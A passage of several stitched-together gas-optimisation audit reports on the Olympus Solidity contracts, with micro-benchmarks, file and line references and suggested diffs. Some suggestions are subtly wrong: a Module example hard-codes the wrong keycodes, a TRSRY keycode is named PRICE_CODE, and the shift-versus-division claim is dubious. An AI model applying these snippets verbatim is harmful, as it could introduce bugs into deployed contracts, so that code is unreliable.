saves 6 gas per instance.  1 instance: Governance.sol line 247  ## USING >= 10  COSTS MORE GAS THAN > 9  1 instance Operator.sol line 486  ## SHORTCIRCUITING OPTIMIZATION  __Kernel.sol line 283:__  The order of the functions inside the if statement in line 283:  ` if (address(oldModule) == address(0) || oldModule == newModule_) `  can be switched to: ` if (oldModule == newModule_ || address(oldModule) == address(0)) ` for optimal gas usage because oldModule == newModule_ is more probable to be TRUE hence second one won’t be executed and hence save you gas.  **Operator.sol line 739:**  Checking sideActive in the second part of the if clause is not necessary because if that second part is executed sideActive can only be true: `  if (             !sideActive ||             (sideActive &&                 auctioneer.isLive(market) &&                 RANGE.capacity(high_) < auctioneer.currentCapacity(market))         ) ` can be switched to: `  if (             !sideActive ||             ( auctioneer.isLive(market) &&                 RANGE.capacity(high_) < auctioneer.currentCapacity(market))         ) `  for optimal gas usage because sideActive is already TRUE hence no need to check it and hence save you gas.   ## USING PRIVATE RATHER THAN PUBLIC FOR CONSTANTS, SAVES GAS  If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  7 instances: -Governance.sol 121, 124, 127, 130, 133, 137  -Operator.sol 89    
### [G-01] ++i costs less gas compared to i++  ++i costs **about 5 gas less per iteration** compared to i++ for unsigned integer.  Same thing for decremental with -- operator. This statement is true even with the optimizer enabled. Summarized my results where i is used in a loop, is unsigned integer, and you safely can be changed to ++i without changing any behavior,  ** Most places are using best practice (++i and unchecked where possible) - good job Yet I've found 5 locations that can do better:  ``` src/policies/Operator.sol:   487              price_ = price_ / 10;   488:             decimals++;   489          }    669                  _status.low.observations[regen.nextObservation] = true;   670:                 _status.low.count++;   671              }    674                  _status.low.observations[regen.nextObservation] = false;   675:                 _status.low.count--;   676              }    685                  _status.high.observations[regen.nextObservation] = true;   686:                 _status.high.count++;   687              }      690                  _status.high.observations[regen.nextObservation] = false;   691:                 _status.high.count--;   692              }    ```  ---------------------------------------------------------------------------   ### [G-02] An arrays length should be cached to save gas in for-loops  An array’s length should be cached to save gas in for-loops Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset). Caching the array length in the stack saves around **3 gas per iteration**.  I've found only 1 location to improve:  ``` src/policies/Governance.sol:   277     278:         for (uint256 step; step < instructions.length; ) {   279              kernel.executeAction(instructions[step].action, instructions[step].target);    ```  ---------------------------------------------------------------------------   ### [G-03] Using default values is cheaper than assignment  If a variable is not set/initialized, it is assumed to have the default value 0 for uint, and false for boolean. Explicitly initializing it with its default value is an anti-pattern and wastes gas. For example: ```uint8 i = 0;``` should be replaced with ```uint8 i;```  I've found 3 locations in 2 files:  ``` src/Kernel.sol:   396          uint256 reqLength = requests_.length;   397:         for (uint256 i = 0; i < reqLength; ) {   398              Permissions memory request = requests_[i];  src/utils/KernelUtils.sol:   42     43:     for (uint256 i = 0; i < 5; ) {   44          bytes1 char = unwrapped[i];    57     58:     for (uint256 i = 0; i < 32; ) {   59          bytes1 char = unwrapped[i];   ```  ---------------------------------------------------------------------------   ### [G-04] != 0 is cheaper than > 0  != 0 costs less gas compared to > 0 for unsigned integers even when optimizer enabled All of the following findings are uint (E&OE) so >0 and != have exactly the same effect. ** saves 6 gas ** each  I've found only 1 place to improve - good job on all other uses of !=  ``` src/policies/Governance.sol:   246     247:         if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {   248              revert UserAlreadyVoted(); ```  ---------------------------------------------------------------------------   ### [G-05] Upgrade pragma to 0.8.16 to save gas  Across the whole solution, the declared pragma is 0.8.15 (good!) Upgrading to 0.8.16 may result in lower gas uses.  Source: ``` According to the release note of 0.8.16: https://blog.soliditylang.org/2022/08/08/solidity-0.8.16-release-announcement/ ".. there are several minor bug fixes and improvements like more gas-efficient overflow checks for addition and subtraction." ```   ---------------------------------------------------------------------------   * Custom errors save gas - already using custom errors all over the project - good job!! * Using immutables (for vars that are only in constructor) seems find throughout the project 
- [Gas](#gas)     - [**1. Don't use the length of an array for loops condition**](#1-dont-use-the-length-of-an-array-for-loops-condition)     - [**2. Reduce boolean comparison**](#2-reduce-boolean-comparison)         - [Total gas saved: **18 * 2 = 36**](#total-gas-saved-18--2--36)     - [**3. Avoid compound assignment operator in state variables**](#3-avoid-compound-assignment-operator-in-state-variables)         - [Total gas saved: **13 * 18 = 234**](#total-gas-saved-13--18--234)     - [**4. Shift right instead of dividing by 2**](#4-shift-right-instead-of-dividing-by-2)         - [Total gas saved: **172 * 2 = 344**](#total-gas-saved-172--2--344)     - [**5. ++i costs less gas compared to i++ or i += 1**](#5-i-costs-less-gas-compared-to-i-or-i--1)     - [**6. There's no need to set default values for variables**](#6-theres-no-need-to-set-default-values-for-variables)         - [Total gas saved: **8 * 2 = 16**](#total-gas-saved-8--2--16)     - [**7. Change bool to uint256 can save gas**](#7-change-bool-to-uint256-can-save-gas)     - [**8. Optimize KEYCODE**](#8-optimize-keycode)         - [Optimize MINTR.KEYCODE](#optimize-mintrkeycode)         - [Optimize INSTR.KEYCODE](#optimize-instrkeycode)         - [Optimize VOTES.KEYCODE](#optimize-voteskeycode)         - [Optimize PRICE.KEYCODE](#optimize-pricekeycode)         - [Optimize TRSRY.KEYCODE](#optimize-trsrykeycode)         - [Optimize RANGE.KEYCODE](#optimize-rangekeycode)     - [**9. Optimize  requestPermissions**](#9-optimize--requestpermissions)         - [Optimize  OlympusPriceConfig.requestPermissions](#optimize--olympuspriceconfigrequestpermissions)         - [Optimize VoterRegistration.requestPermissions](#optimize-voterregistrationrequestpermissions)     - [**10. Optimize configureDependencies using immutable**](#10-optimize-configuredependencies-using-immutable)         - [Optimize OlympusPriceConfig.configureDependencies](#optimize-olympuspriceconfigconfiguredependencies)         - [Optimize TreasuryCustodian.configureDependencies](#optimize-treasurycustodianconfiguredependencies)         - [Optimize BondCallback.configureDependencies](#optimize-bondcallbackconfiguredependencies)         - [Optimize Governance.configureDependencies](#optimize-governanceconfiguredependencies)         - [Optimize Operator.configureDependencies](#optimize-operatorconfiguredependencies)     - [**11. Avoid storage use**](#11-avoid-storage-use)     - [**12. Use inline instead of a method**](#12-use-inline-instead-of-a-method)     - [**13. Gas saving using immutable**](#13-gas-saving-using-immutable)     - [**14. Avoid public constants**](#14-avoid-public-constants)     - [**15. Reduce math operations**](#15-reduce-math-operations)         - [Optimize Governance.submitProposal](#optimize-governancesubmitproposal)         - [Optimize Governance.activateProposal](#optimize-governanceactivateproposal)         - [Optimize Governance.executeProposal](#optimize-governanceexecuteproposal)         - [Optimize Operator._activate](#optimize-operator_activate)     - [**16. Use calldata instead of memory**](#16-use-calldata-instead-of-memory)     - [**17. Optimze instructions order**](#17-optimze-instructions-order)         - [Optimize Governance.endorseProposal](#optimize-governanceendorseproposal)         - [Optimize Governance.endorseProposal](#optimize-governanceendorseproposal)     - [**18. Optimze Governance storage**](#18-optimze-governance-storage)     - [**19. delete optimization**](#19-delete-optimization)         - [Total gas saved: **5 * 1 = 5**](#total-gas-saved-5--1--5)     - [**20. Optimize Operator.bondPurchase**](#20-optimize-operatorbondpurchase)     - [**21. Optimize Operator refactoring some methods**](#21-optimize-operator-refactoring-some-methods)     - [**22. Optimize Operator.setRegenParams and Operator._regenerate**](#22-optimize-operatorsetregenparams-and-operator_regenerate)  # Gas  ## **1. Don't use the length of an array for loops condition**  It's cheaper to store the length of the array inside a local variable and iterate over it.  **Affected source code:**  - [Governance.sol:278](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L278)  ## **2. Reduce boolean comparison**  It's compared a boolean value using `== true` or `== false`, instead of using the boolean value. `NOT` opcode, it's cheaper to use `EQUAL` or `NOTEQUAL` when the value it's false, or just the value without `== true` when it's true, because it will use less opcodes inside the VM.  **Proof of concept (*without optimizations*):**  ```javascript pragma solidity 0.8.16;  contract TesterA { function testEqual(bool a) public view returns (bool) { return a == true; } }  contract TesterB { function testNot(bool a) public view returns (bool) { return a; } } ```  Gas saving executing: **18 per entry for == true**  ``` TesterA.testEqual:   21814 TesterB.testNot:     21796    ```  ```javascript pragma solidity 0.8.16;  contract TesterA { function testEqual(bool a) public view returns (bool) { return a == false; } }  contract TesterB { function testNot(bool a) public view returns (bool) { return !a; } } ```  Gas saving executing: **15 per entry for == false**  ``` TesterA.testEqual:   21814  TesterB.testNot:     21799 ```  **Affected source code:**  Use the value instead of `== true`:  - [Governance.sol:223](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L223) - [Governance.sol:306](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L306)  ### Total gas saved: **18 * 2 = 36**  ## **3. Avoid compound assignment operator in state variables**  Using compound assignment operator for state variables (like `State += X` or `State -= X` ...) it's more expensive than use operator assignment (like `State = State + X` or `State = State - X` ...).  **Proof of concept (*without optimizations*):**  ```javascript pragma solidity 0.8.15;  contract TesterA { uint private _a; function testShort() public {  _a += 1; } }  contract TesterB { uint private _a; function testLong() public {  _a = _a + 1; } } ```  Gas saving executing: **13 per entry**  ``` TesterA.testShort: 43507 TesterB.testLong:  43494 ```  **Affected source code:**  - [PRICE.sol:136](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L136) - [PRICE.sol:138](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L138) - [PRICE.sol:222](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L222) - [TRSRY.sol:96](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L96) - [TRSRY.sol:97](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L97) - [TRSRY.sol:115](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L115) - [TRSRY.sol:116](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L116) - [TRSRY.sol:131](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L131) - [TRSRY.sol:132](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L132) - [VOTES.sol:56](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L56) - [VOTES.sol:58](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L58) - [BondCallback.sol:143](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L143) - [BondCallback.sol:144](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L144) - [Governance.sol:194](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L194) - [Governance.sol:198](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L198) - [Governance.sol:252](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L252) - [Governance.sol:254](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L254) - [Heart.sol:103](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Heart.sol#L103)  ### Total gas saved: **13 * 18 = 234**  ## **4. Shift right instead of dividing by 2**  Shifting one to the right will calculate a division by two.  he `SHR` opcode only requires 3 gas, compared to the `DIV` opcode's consumption of 5. Additionally, shifting is used to get around Solidity's division operation's division-by-0 prohibition.  **Proof of concept (*without optimizations*):**  ```javascript pragma solidity 0.8.15;  contract TesterA {  function testDiv(uint a) public returns (uint) { return a / 2; } }  contract TesterB {  function testShift(uint a) public returns (uint) { return a >> 1; } } ```  Gas saving executing: **172 per entry**  ``` TesterA.testDiv:    21965 TesterB.testShift:  21793    ```  **Affected source code:**  - [Operator.sol:372](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L372) - [Operator.sol:427](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L427)  ### Total gas saved: **172 * 2 = 344**  ## **5. `++i` costs less gas compared to `i++` or `i += 1`**  `++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  `i++` increments `i` and returns the initial value of `i`. Which means:  ```solidity uint i = 1; i++; // == 1 but i == 2 ```  But `++i` returns the actual incremented value:  ```solidity uint i = 1; ++i; // == 2 and i == 2 too, so no need for a temporary variable ```  In the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2` I suggest using `++i` instead of `i++` to increment the value of an uint variable. Same thing for `--i` and `i--`  *Keep in mind that this change can only be made when we are not interested in the value returned by the operation, since the result is different, you only have to apply it when you only want to increase a counter.*  **Affected source code:**  - [Operator.sol:488](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L488) - [Operator.sol:670](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L670) - [Operator.sol:675](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L675) - [Operator.sol:686](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L686) - [Operator.sol:691](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L691) - [KernelUtils.sol:49](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L49) - [KernelUtils.sol:64](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L64)  ## **6. There's no need to set default values for variables**  If a variable is not set/initialized, the default value is assumed (0, `false`, 0x0 ... depending on the data type). You are simply wasting gas if you directly initialize it with its default value.  **Proof of concept (*without optimizations*):**  ```javascript pragma solidity 0.8.15;  contract TesterA { function testInit() public view returns (uint) { uint a = 0; return a; } }  contract TesterB { function testNoInit() public view returns (uint) { uint a; return a; } } ```  Gas saving executing: **8 per entry**  ``` TesterA.testInit:   21392 TesterB.testNoInit: 21384    ```  **Affected source code:**  - [KernelUtils.sol:43](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L43) - [KernelUtils.sol:58](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L58)  ### Total gas saved: **8 * 2 = 16**      ## **7. Change `bool` to `uint256` can save gas**  Because each write operation requires an additional `SLOAD` to read the slot's contents, replace the bits occupied by the boolean, and then write back, `booleans` are more expensive than `uint256` or any other type that uses a complete word. This cannot be turned off because it is the compiler's defense against pointer aliasing and contract upgrades.  Reference:  - https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol#L23-L27  Also, this is applicable to integer types different than `uint256` or `int56`.  **Affected source code for `booleans`:**  - [IOperator.sol:34](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/interfaces/IOperator.sol#L34) - [Heart.sol:33](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Heart.sol#L33) - [Governance.sol:105](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L105) - [Governance.sol:117](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L117) - [Operator.sol:63](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L63) - [Operator.sol:66](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L66)  **Affected source code for `integers`:**  - [PRICE.sol:44](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L44) - [PRICE.sol:47](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L47) - [PRICE.sol:50](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L50) - [PRICE.sol:53](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L53) - [PRICE.sol:56](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L56) - [PRICE.sol:62](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L62)  ## **8. Optimize `KEYCODE`**  It is possible to optimize the `KEYCODE` method from the `Module` contract as shown below, or send the keycode to the base constructor to use the immutable in the base contract, as shown below.  ```javascript abstract contract Module is KernelAdapter {     KeyCode private immutable _KEYCODE;     constructor(Kernel kernel_, string memory keycode) KernelAdapter(kernel_) {          _KEYCODE = toKeycode("MINTR");     }     function KEYCODE() public pure virtual returns (Keycode) { return _KEYCODE; }     ... } contract OlympusTreasury is Module, ReentrancyGuard { ...     constructor(Kernel kernel_) Module(kernel_, "PRICE") {}     ... } ```  ### Optimize `MINTR.KEYCODE`  **Recommended changes:**  ```diff +   KeyCode private immutable _KEYCODE = toKeycode("MINTR");     function KEYCODE() public pure override returns (Keycode) { +       return _KEYCODE; -       return toKeycode("MINTR");     } ```  **Affected source code:**  - [MINTR.sol:20-22](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/MINTR.sol#L20-L22)  ### Optimize `INSTR.KEYCODE`  **Recommended changes:**  ```diff +   KeyCode private immutable _KEYCODE = toKeycode("INSTR");     function KEYCODE() public pure override returns (Keycode) { +       return _KEYCODE; -       return toKeycode("INSTR");     } ```  **Affected source code:**  - [INSTR.sol:24](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L24)  ### Optimize `VOTES.KEYCODE`  **Recommended changes:**  ```diff +   KeyCode private immutable _KEYCODE = toKeycode("VOTES");     function KEYCODE() public pure override returns (Keycode) { +       return _KEYCODE; -       return toKeycode("VOTES");     } ```  **Affected source code:**  - [VOTES.sol:23](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L23)  ### Optimize `PRICE.KEYCODE`  **Recommended changes:**  ```diff +   KeyCode private immutable _KEYCODE = toKeycode("PRICE");     function KEYCODE() public pure override returns (Keycode) { +       return _KEYCODE; -       return toKeycode("PRICE");     } ```  **Affected source code:**  - [PRICE.sol:109](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L109)  ### Optimize `TRSRY.KEYCODE`  **Recommended changes:**  ```diff +   KeyCode private immutable _KEYCODE = toKeycode("TRSRY");     function KEYCODE() public pure override returns (Keycode) { +       return _KEYCODE; -       return toKeycode("TRSRY");     } ```  **Affected source code:**  - [TRSRY.sol:48](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L48)  ### Optimize `RANGE.KEYCODE`  **Recommended changes:**  ```diff +   KeyCode private immutable _KEYCODE = toKeycode("RANGE");     function KEYCODE() public pure override returns (Keycode) { +       return _KEYCODE; -       return toKeycode("RANGE");     } ```  **Affected source code:**  - [RANGE.sol:111](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L111)  ## **9. Optimize  `requestPermissions`** ### Optimize  `OlympusPriceConfig.requestPermissions`  **Recommended changes:**  ```diff     function requestPermissions()         external         view         override         returns (Permissions[] memory permissions)     {         permissions = new Permissions[](3); +       Keycode priceCode = PRICE.KEYCODE(); +       permissions[0] = Permissions(priceCode, PRICE.initialize.selector); +       permissions[1] = Permissions(priceCode, PRICE.changeMovingAverageDuration.selector); +       permissions[2] = Permissions(priceCode, PRICE.changeObservationFrequency.selector); -       permissions[0] = Permissions(PRICE.KEYCODE(), PRICE.initialize.selector); -       permissions[1] = Permissions(PRICE.KEYCODE(), PRICE.changeMovingAverageDuration.selector); -       permissions[2] = Permissions(PRICE.KEYCODE(), PRICE.changeObservationFrequency.selector);     } ```  **Affected source code:**  - [PriceConfig.sol:32-34](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/PriceConfig.sol#L32-L34)  ### Optimize `VoterRegistration.requestPermissions`  **Recommended changes:**  ```diff     function requestPermissions()         external         view         override         returns (Permissions[] memory permissions)     {         permissions = new Permissions[](2); +       Keycode votesCode = VOTES.KEYCODE(); +       permissions[0] = Permissions(votesCode, VOTES.mintTo.selector); +       permissions[1] = Permissions(votesCode, VOTES.burnFrom.selector); -       permissions[0] = Permissions(VOTES.KEYCODE(), VOTES.mintTo.selector); -       permissions[1] = Permissions(VOTES.KEYCODE(), VOTES.burnFrom.selector);     } ```  **Affected source code:**  - [VoterRegistration.sol:27-36](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/VoterRegistration.sol#L27-L36)  ## **10. Optimize `configureDependencies` using `immutable`**  ### Optimize `OlympusPriceConfig.configureDependencies`  **Recommended changes:**  ```diff +   KeyCode private immutable PRICE_CODE = toKeycode("PRICE");      function configureDependencies() external override returns (Keycode[] memory dependencies) {         dependencies = new Keycode[](1); -       dependencies[0] = toKeycode("PRICE"); +       dependencies[0] = PRICE_CODE;          PRICE = OlympusPrice(getModuleAddress(dependencies[0]));     } ```  **Affected source code:**  - [PriceConfig.sol:20](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/PriceConfig.sol#L20)  ### Optimize `TreasuryCustodian.configureDependencies`  **Recommended changes:**  ```diff +   KeyCode private immutable PRICE_CODE = toKeycode("TRSRY");      function configureDependencies() external override returns (Keycode[] memory dependencies) {         dependencies = new Keycode[](1); +       dependencies[0] = PRICE_CODE; -       dependencies[0] = toKeycode("TRSRY");          TRSRY = OlympusTreasury(getModuleAddress(dependencies[0]));     } ```  **Affected source code:**  - [TreasuryCustodian.sol:29](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/TreasuryCustodian.sol#L29)  ### Optimize `BondCallback.configureDependencies`  ```diff +   KeyCode private immutable dep0 = toKeycode("TRSRY"); +   KeyCode private immutable dep1 = toKeycode("MINTR");      function configureDependencies() external override returns (Keycode[] memory dependencies) {         dependencies = new Keycode[](2); -       dependencies[0] = toKeycode("TRSRY"); -       dependencies[1] = toKeycode("MINTR"); +       dependencies[0] = dep0; +       dependencies[1] = dep1;  -       TRSRY = OlympusTreasury(getModuleAddress(dependencies[0])); -       MINTR = OlympusMinter(getModuleAddress(dependencies[1])); +       TRSRY = OlympusTreasury(getModuleAddress(dep0)); +       MINTR = OlympusMinter(getModuleAddress(dep1));          // Approve MINTR for burning OHM (called here so that it is re-approved on updates)         ohm.safeApprove(address(MINTR), type(uint256).max);     } ```  **Affected source code:**  - [BondCallback.sol:50-51](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L50-L51)  ### Optimize `Governance.configureDependencies`  ```diff +   KeyCode private immutable dep0 = toKeycode("INSTR"); +   KeyCode private immutable dep1 = toKeycode("VOTES");      function configureDependencies() external override returns (Keycode[] memory dependencies) {         dependencies = new Keycode[](2); -       dependencies[0] = toKeycode("INSTR"); -       dependencies[1] = toKeycode("VOTES"); +       dependencies[0] = dep0; +       dependencies[1] = dep1;  -       INSTR = OlympusInstructions(getModuleAddress(dependencies[0])); -       VOTES = OlympusVotes(getModuleAddress(dependencies[1])); +       INSTR = OlympusInstructions(getModuleAddress(dep0)); +       VOTES = OlympusVotes(getModuleAddress(dep1));     } ```  **Affected source code:**  - [Governance.sol:61-68](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L61-L68)  ### Optimize `Operator.configureDependencies`  ```diff +   KeyCode private immutable dep0 = toKeycode("PRICE"); +   KeyCode private immutable dep1 = toKeycode("RANGE"); +   KeyCode private immutable dep2 = toKeycode("TRSRY"); +   KeyCode private immutable dep3 = toKeycode("MINTR");      function configureDependencies() external override returns (Keycode[] memory dependencies) {         dependencies = new Keycode[](4); -       dependencies[0] = toKeycode("PRICE"); -       dependencies[1] = toKeycode("RANGE"); -       dependencies[2] = toKeycode("TRSRY"); -       dependencies[3] = toKeycode("MINTR"); +       dependencies[0] = dep0; +       dependencies[1] = dep1; +       dependencies[2] = dep2; +       dependencies[3] = dep3;  -       PRICE = OlympusPrice(getModuleAddress(dependencies[0])); -       RANGE = OlympusRange(getModuleAddress(dependencies[1])); -       TRSRY = OlympusTreasury(getModuleAddress(dependencies[2])); -       MINTR = OlympusMinter(getModuleAddress(dependencies[3])); +       PRICE = OlympusPrice(getModuleAddress(dep0)); +       RANGE = OlympusRange(getModuleAddress(dep1)); +       TRSRY = OlympusTreasury(getModuleAddress(dep2)); +       MINTR = OlympusMinter(getModuleAddress(dep3));          /// Approve MINTR for burning OHM (called here so that it is re-approved on updates)         ohm.safeApprove(address(MINTR), type(uint256).max);     } ```  **Affected source code:**  - [Operator.sol:154-168](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L154-L168)  ## **11. Avoid storage use**  It is possible to avoid storage accesses by taking advantage of memory variables that have the same value, as shown below.  **Recommended changes:**  ```diff     constructor(         Kernel kernel_,         AggregatorV2V3Interface ohmEthPriceFeed_,         AggregatorV2V3Interface reserveEthPriceFeed_,         uint48 observationFrequency_,         uint48 movingAverageDuration_     ) Module(kernel_) {         /// @dev Moving Average Duration should be divisible by Observation Frequency to get a whole number of observations         if (movingAverageDuration_ == 0 || movingAverageDuration_ % observationFrequency_ != 0)             revert Price_InvalidParams();          // Set price feeds, decimals, and scale factor         _ohmEthPriceFeed = ohmEthPriceFeed_; -       uint8 ohmEthDecimals = _ohmEthPriceFeed.decimals(); +       uint8 ohmEthDecimals = ohmEthPriceFeed_.decimals();          _reserveEthPriceFeed = reserveEthPriceFeed_; -       uint8 reserveEthDecimals = _reserveEthPriceFeed.decimals(); +       uint8 reserveEthDecimals = reserveEthPriceFeed_.decimals(); ```  **Affected source code:**  - [PRICE.sol:84](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L84) - [PRICE.sol:87](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L87)  ## **12. Use `inline` instead of a method**  The following methods can be moved to inline calls without greatly affecting readability, this will increase the performance of the contract.  **Recommended changes:**  ```diff     function beat() external nonReentrant {         ...          // Issue reward to sender -       _issueReward(msg.sender); +       rewardToken.safeTransfer(msg.sender, reward); +       emit RewardIssued(msg.sender, reward);         emit Beat(block.timestamp);     }  -   function _issueReward(address to_) internal { -       rewardToken.safeTransfer(to_, reward); -       emit RewardIssued(to_, reward); -   } ```  **Affected source code:**  - [Heart.sol:111-114](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Heart.sol#L111-L114)  ## **13. Gas saving using `immutable`**  It's possible to avoid storage access a save gas using `immutable` keyword for the following variables:  It's also better to remove the initial values, because they will be set during the constructor.  **Affected source code:**  - [BondCallback.sol:28](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L28) - [BondCallback.sol:32](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L32)  ## **14. Avoid public constants**  The number of public methods increase the bytecode of the contract, in addition to the possible attack vectors, reducing the number to the minimum necessary for the contract to work normally is a good practice for both security and gas savings.  It can be more efficient to change constants that shouldn't be made `public` to private or `internal` to stay away from pointless getter functions.  **Affected source code:**  - [Operator.sol:89](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L89) - 